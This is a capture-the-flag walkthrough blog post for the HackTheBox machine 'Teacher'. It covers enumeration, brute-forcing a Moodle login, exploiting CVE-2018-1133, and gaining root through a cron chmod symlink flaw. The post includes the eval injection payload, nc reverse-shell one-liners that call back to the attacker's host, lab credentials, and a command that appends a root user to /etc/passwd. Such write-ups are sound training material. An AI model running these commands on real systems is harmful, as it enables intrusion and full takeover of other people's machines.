---
title: HTB: Teacher
url: https://0xdf.gitlab.io/2019/04/20/htb-teacher.html
date: 2019-04-20T13:45:00+00:00
difficulty: Easy [20]
os: Linux
tags: htb-teacher, ctf, hackthebox, debian, stretch, nmap, gobuster, skipfish, hydra, python, cve-2018-1133, crackstation, mysql, pspy, su, cron, chmod, passwd, arbitrary-write, moodle
---

![Teacher-cover](https://0xdfimages.gitlab.io/img/teacher-cover.png)

Teacher was 20-point box (despite the yellow avatar). At the start, it required enumerating a website and finding a png file that was actually a text file that revealed most of a password. I’ll use hydra to brute force the last character of the password, and gain access to a Moodle instance, software designed for online learning. I’ll abuse a PHP injection in the quiz feature to get code execution and a shell on the box. Then, I’ll find an md5 in the database that is the password for the main user on the box. From there, I’ll take advantage of a root cron that’s running a backup script, and give myself write access to whatever I want, which I’ll use to get root.

## Box Info

| Name | [Teacher](https://hackthebox.com/machines/teacher)  [Teacher](https://hackthebox.com/machines/teacher) [Play on HackTheBox](https://hackthebox.com/machines/teacher) |
| --- | --- |
| Release Date | [01 Dec 2018](https://twitter.com/hackthebox_eu/status/1068103141256777728) |
| Retire Date | 20 Apr 2019 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Teacher |
| Radar Graph | Radar chart for Teacher |
| First Blood User | 02:17:00[0xEA31 0xEA31](https://app.hackthebox.com/users/13340) |
| First Blood Root | 03:29:16[Firzen Firzen](https://app.hackthebox.com/users/79627) |
| Creator | [Gioo Gioo](https://app.hackthebox.com/users/623) |

## Recon

### nmap

`nmap` shows only a single port serving http over 80:

```

root@kali# nmap -sT -p- --min-rate 10000 -oA nmap/alltcp 10.10.10.153
Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-03 17:05 EST
Nmap scan report for 10.10.10.153
Host is up (0.024s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.56 seconds

root@kali# nmap -sU -p- --min-rate 10000 -oA nmap/alludp 10.10.10.153                                                                                                                    
Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-03 17:05 EST
Warning: 10.10.10.153 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.153
Host is up (0.021s latency).
All 65535 scanned ports on 10.10.10.153 are open|filtered (65457) or closed (78)

Nmap done: 1 IP address (1 host up) scanned in 73.22 seconds

root@kali# nmap -sV -sC -p 80 -oA nmap/scripts 10.10.10.153
Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-03 17:07 EST
Nmap scan report for 10.10.10.153
Host is up (0.021s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Blackhat highschool

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.60 seconds

```

Based on the versions it looks like a Debian 9 (stretch) box.

### Website - port 80

#### Site

A hacker university site:

![1543875123965](https://0xdfimages.gitlab.io/img/1543875123965.png)

I didn’t find much interesting on the site itself.

#### gobuster

`gobuster` revealed a few interesting paths:

```

root@kali# gobuster -u http://10.10.10.153 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.153/
[+] Threads      : 50
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2018/12/03 17:13:59 Starting gobuster
=====================================================
/images (Status: 301)
/css (Status: 301)
/manual (Status: 301)
/js (Status: 301)
/javascript (Status: 301)
/fonts (Status: 301)
/phpmyadmin (Status: 403)
/moodle (Status: 301)
=====================================================
2018/12/03 17:15:08 Finished
=====================================================

```

#### Finding 5.png

I didn’t care for this part of the box. Somehow, I’m supposed to find `5.png`. I don’t love any path to get there, but I’ll discuss a few.

The `/images` directory has a bunch of images (not surprising):

![1555337693635](https://0xdfimages.gitlab.io/img/1555337693635.png)

Looking at the, `5.png`, it’s orders of magnitude smaller than the others. If I click on it, it doesn’t load:

![1555338114030](https://0xdfimages.gitlab.io/img/1555338114030.png)

Alternatively, I did play with a tool called [Skipfish](https://tools.kali.org/web-applications/skipfish). It took a while to run, and produced a ton of data. I don’t think it is a tool I’ll use often, but it did generate a nice report that would have identified this weird file:

![1543939352154](https://0xdfimages.gitlab.io/img/1543939352154.png)

At the bottom, there’s a section for “Incorrect or missing MIME type”, where it says this png is actually “text/plain”.

I heard of others mirroring the entire site to their box and then grepping through it for password, which would have worked to.

#### 5.png

However I find it, `5.png` isn’t an image, but a note:

```

root@kali# curl http://10.10.10.153/images/5.png
Hi Servicedesk,

I forgot the last character of my password. The only part I remembered is Th4C00lTheacha.

Could you guys figure out what the last charachter is, or just reset it?

Thanks,
Giovanni

```

I’ll note that partial password.

#### Moodle

`/moodle` is an instance of course software. I see the teacher name Giovanni matches the name from the note:

![1543876433940](https://0xdfimages.gitlab.io/img/1543876433940.png)

Clicking anywhere takes me to the login page.

## Shell as www-data

### Brute Force Giovanni

From the note I know all but the last character of the password to log into something. I’m going to guess/hope that’s Moodle. I’ll use `python` to generate passwords:

```

root@kali# python3 -c 'import string; print("\n".join([f"Th4C00lTheacha{c}" for c in string.printable[:-5]]))' > passwords

```

For those not familiar with the python list comprehension syntax, here’s what that one-liner is doing:
- First I import the string library.
- `[f"Th4C00lTheacha{c}" for c in string.printable[:-5]]` creates an array. To do so, it will loop over the elements of `string.printable` (technically all but the last 5 which I’ve left off with `[:-5]`). For each element, it will add `f"Th4C00lTheacha{c}"` to the array, where `c` is the element. This is the python f-string format, so `{c}` is just replaced with the variable value.
- Now with an array of the password with lots of different last characters, I’ll pass that to `'\n'.join(array)`, which builds a string by combining all the elements with `\n`.
- That is printed and redirected to a file, `passwords`.

Now I’ll use `hydra` to try them and find the password:

```

root@kali# hydra -l Giovanni -P passwords 10.10.10.153 http-post-form "/moodle/login/index.php:anchor=&username=^USER^&password=^PASS^&rememberusername=1:Invalid login"                 
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.                                                                                            

Hydra (http://www.thc.org/thc-hydra) starting at 2018-12-04 11:16:47
[DATA] max 16 tasks per 1 server, overall 16 tasks, 95 login tries (l:1/p:95), ~6 tries per task
[DATA] attacking http-post-form://10.10.10.153:80//moodle/login/index.php:anchor=&username=^USER^&password=^PASS^&rememberusername=1:Invalid login                                                                         
[80][http-post-form] host: 10.10.10.153   login: Giovanni   password: Th4C00lTheacha#
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2018-12-04 11:17:24

```

### RCE in moodle

#### Background

[CVE-2018-1133](https://blog.ripstech.com/2018/moodle-remote-code-execution/) was a vulnerability that allows any user in the teacher role to get remote code execution through Moodle. The vulnerability is in the part of the code that allows a teacher to define a problem like “What is {x} + {y}?”, and have different x and y for each student. Moodle picks a random x and y, and then gets the answer by calling php’s `eval()` on the formula input. So if I can poison the input, I can get it to run my code. The [post](https://blog.ripstech.com/2018/moodle-remote-code-execution/) gives the following string that will give execution and bypass filters:

```

/*{a*/`$_GET[0]`;//{x}}

```

#### Execution

I’ll log in using giovanni / Th4C00lTheacha#, and then go to Algebra. From there, I’ll click the gear icon and “Turn editing on”:

![1555339641587](https://0xdfimages.gitlab.io/img/1555339641587.png)

Then, for any of the Topics, I’ll click “Add an activity or resource”, select Quiz, and hit “Add”. I’ll make up a name and description, and save it.

Now I can click on the quiz and then click the “Edit Quiz” button. I’ll click “Add” and then “a new question”. In the pop-up I’ll select “Calculated” and click “Add”. I’ll fill in all the required fields, but the only one that matters is the “Answer 1 formula”. In there I’ll add the string from exploit.

I’ll save, hit next, and then add `&0=ping -c 1 10.10.14.3` to end of url. When I do, I see a ping back to me on `tcpdump`.

Here’s the full attack:

[![Full Exploit POC](https://0xdfimages.gitlab.io/img/teacher-rce.gif)*Click for full size image*](https://0xdfimages.gitlab.io/img/teacher-rce.gif)

### Shell

I’ll use this RCE to get a shell, grabbing my go to from the [reverse shell cheat sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), adding `0=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>%261|nc 10.10.14.3 443 >/tmp/f` to the end of the url. I did have to encode the `&` so that it wasn’t treated as another parameter. I’ll get a callback on `nc`:

```

root@kali# rlwrap nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.153.
Ncat: Connection from 10.10.10.153:40490.
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

### Upgrade

I’ll upgrade my shell to a full tty. Use `python` to launch bash through the `pty` module. Background the shell with Ctrl-z, then run `stty raw -echo`. Then type `fg` to bring the shell back to the foreground. And run `reset` to get the shell working again. Finally, I’ll `export TERM=screen` so I can clear and other things like that.

```

$ python -c 'import pty;pty.spawn("bash")'
www-data@teacher:/var/www/html/moodle/question$ 
[1]+  Stopped                 rlwrap nc -lnvp 443
root@kali# stty raw -echo
root@kali# rlwrap nc -lnvp 443
www-data@teacher:/var/www/html/moodle/question$ reset
reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@teacher:/var/www$ export TERM=screen

```

Now I’ve got a shell with tab completion and arrow keys.

## Privesc: www-data -> giovanni

### Find Database Password

In the website code I’ll find the database info for Moodle:

```

www-data@teacher:/var/www/html/moodle$ cat config.php
<?php  // Moodle configuration file

unset($CFG);
global $CFG;
$CFG = new stdClass();

$CFG->dbtype    = 'mariadb';
$CFG->dblibrary = 'native';
$CFG->dbhost    = 'localhost';
$CFG->dbname    = 'moodle';
$CFG->dbuser    = 'root';
$CFG->dbpass    = 'Welkom1!';
$CFG->prefix    = 'mdl_';
$CFG->dboptions = array (
  'dbpersist' => 0,
  'dbport' => 3306,
  'dbsocket' => '',
  'dbcollation' => 'utf8mb4_unicode_ci',
);

$CFG->wwwroot   = 'http://10.10.10.153/moodle';
$CFG->dataroot  = '/var/www/moodledata';
$CFG->admin     = 'admin';

$CFG->directorypermissions = 0777;

require_once(__DIR__ . '/lib/setup.php');

// There is no php closing tag in this file,
// it is intentional because it prevents trailing whitespace problems!

```

### Connect to DB

I can use that password to connect to the database and explore. In the user table, there’s one entry that stands out:

```

www-data@teacher:/var/www/html/moodle$ mysql -u root -p
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 709
Server version: 10.1.26-MariaDB-0+deb9u1 Debian 9.1

Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| moodle             |
| mysql              |
| performance_schema |
| phpmyadmin         |
+--------------------+
5 rows in set (0.00 sec)

MariaDB [(none)]> use moodle
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [moodle]> select username,password from mdl_user;
+-------------+--------------------------------------------------------------+
| username    | password                                                     |
+-------------+--------------------------------------------------------------+
| guest       | $2y$10$ywuE5gDlAlaCu9R0w7pKW.UCB0jUH6ZVKcitP3gMtUNrAebiGMOdO |
| admin       | $2y$10$7VPsdU9/9y2J4Mynlt6vM.a4coqHRXsNTOq/1aA6wCWTsF2wtrDO2 |
| giovanni    | $2y$10$38V6kI7LNudORa7lBAT0q.vsQsv4PemY7rf/M1Zkj/i1VqLO0FSYO |
| Giovannibak | 7a860966115182402ed06375cf0a22af                             |
+-------------+--------------------------------------------------------------+

```

While the first three passwords look like blowfish, the last one, Giovannibak is an md5 hash. I can drop it into [crackstation](https://crackstation.net/) and get the password:

![1543948091985](https://0xdfimages.gitlab.io/img/1543948091985.png)

### su giovanni

With that password, I can `su` to get a shell as giovanni:

```

www-data@teacher:/var/www/html/moodle$ su giovanni
Password: 
giovanni@teacher:/var/www/html/moodle$

```

From there, I can get `user.txt`:

```

giovanni@teacher:~$ cat user.txt 
fa9ae187...

```

## Privesc: giovanni –> root

### Enumeration

In home dir, there’s a work directory:

```

giovanni@teacher:~$ find .
.
./.nano
./.bash_logout
./.bash_history
./user.txt
./.bashrc
./.profile
./work
./work/tmp
./work/tmp/courses
./work/tmp/courses/algebra
./work/tmp/courses/algebra/answersAlgebra
./work/tmp/backup_courses.tar.gz
./work/courses
./work/courses/algebra
./work/courses/algebra/answersAlgebra

```

If I check the timestamp on `./work/tmp/backup_courses.tar.gz`, it’s always the current minute, and it’s owned by root.

I can verify that there’s a task running with [pspy](https://github.com/DominicBreuker/pspy):

```

2018/12/02 19:32:01 CMD: UID=0    PID=9277   | /usr/sbin/CRON -f 
2018/12/02 19:32:01 CMD: UID=0    PID=9278   | /usr/sbin/CRON -f 
2018/12/02 19:32:01 CMD: UID=0    PID=9279   | /bin/sh -c /usr/bin/backup.sh 
2018/12/02 19:32:01 CMD: UID=0    PID=9280   | /bin/bash /usr/bin/backup.sh 
2018/12/02 19:32:01 CMD: UID=0    PID=9281   | tar -czvf tmp/backup_courses.tar.gz courses/algebra 
2018/12/02 19:32:01 CMD: UID=0    PID=9282   | /bin/sh -c gzip 
2018/12/02 19:32:01 CMD: UID=0    PID=9283   | /bin/bash /usr/bin/backup.sh 
2018/12/02 19:32:01 CMD: UID=0    PID=9284   | tar -xf backup_courses.tar.gz 
2018/12/02 19:32:01 CMD: UID=0    PID=9285   | /bin/bash /usr/bin/backup.sh 

```

### backup.sh

I’ll check out the script:

```

giovanni@teacher:~/work/tmp$ cat /usr/bin/backup.sh 
#!/bin/bash
cd /home/giovanni/work;
tar -czvf tmp/backup_courses.tar.gz courses/*;
cd tmp;
tar -xf backup_courses.tar.gz;
chmod 777 * -R;

```

It is going into the `work` directory and using `tar` to add the courses directory to an archive in the `tmp` directory.. Then it goes into the `tmp` folder and extracts that archive, and sets everything in it to world read/write/executable.

I can’ modify the script itself, as it’s owned and only writable by root:

```

giovanni@teacher:~$ ls -l /usr/bin/backup.sh 
-rwxr-xr-x 1 root root 138 Jun 27 04:30 /usr/bin/backup.sh

```

### Strategy

I’m going to take advantage of the fact that I can write symlinks pointing to directories / files I don’t own. From `man chmod`:

> chmod never changes the permissions of symbolic links; the chmod system call cannot change their permissions. This is not a problem since the permissions of symbolic links are never used. However, for each symbolic link listed on the command line, chmod changes the permissions of the pointed-to file. In contrast, chmod ignores symbolic links encountered during recursive directory traversals

This last bit might be distracting / confusing. `chmod` doesn’t touch symlinks during recursive. At first I was tempted to think that meant that if `-R` was there, then it doesn’t touch symlinks. But really, this just says that it will only follow symlinks that are directly referenced by the command line (after wildcard expansion).

So if I create a symbolic link in `~/work/tmp`, the thing it points to will have it’s permissions changed.

### Shell as root

To solve this, I thought about what file I would want to change permissions on. There’s a ton of options. I’ll show a couple of examples.

#### /usr/bin/backup.sh

The script itself is being run by root every minute. If I can make it writable, I can put more code in and have it run by root.

Create the link:

```

giovanni@teacher:~/work/tmp$ ln -s /usr/bin/backup.sh 

```

Wait a minute:

![](https://0xdfimages.gitlab.io/img/teacher-chmod.gif)

Now I can add a shell to the script:

```

giovanni@teacher:~/work/tmp$ echo "nc -e /bin/bash 10.10.14.3 443" >> /usr/bin/backup.sh

```

Wait a minute, and get a shell:

```

root@kali# rlwrap nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.153.
Ncat: Connection from 10.10.10.153:46014.
id
uid=0(root) gid=0(root) groups=0(root)

```

And `root.txt`:

```

root@teacher:~# cat root.txt 
4f3a83b4...

```

#### /etc/passwd

Rather than getting another callback, what if I just get access to `/etc/passwd`:

```

giovanni@teacher:~/work/tmp$ ln -s /etc/passwd

```

Now I can add myself as root user. First, create a hash:

```

root@kali# openssl passwd -1 -salt xyz password
$1$xyz$cEUv8aN9ehjhMXG/kSFnM1

```

Now add myself:

```

giovanni@teacher:~/work/tmp$ echo 'oxdf:$1$xyz$cEUv8aN9ehjhMXG/kSFnM1:0:0:pwned:/root:/bin/bash' >> /etc/passwd

```

Now I just `su` to my new user, who is root:

```

giovanni@teacher:~/work/tmp$ su oxdf
Password: 
root@teacher:/home/giovanni/work/tmp#

```

#### Others

There are several other options that come immediately to mind. Point to a suid binary, and once writable, replace it with my own. Or get permissions to the cron directory for root, and write a shell in there. Or, if I wanted to be blunt, I could just point it at `/`, and let `chmod` recursively give me (and everyone else) access to the entire filesystem.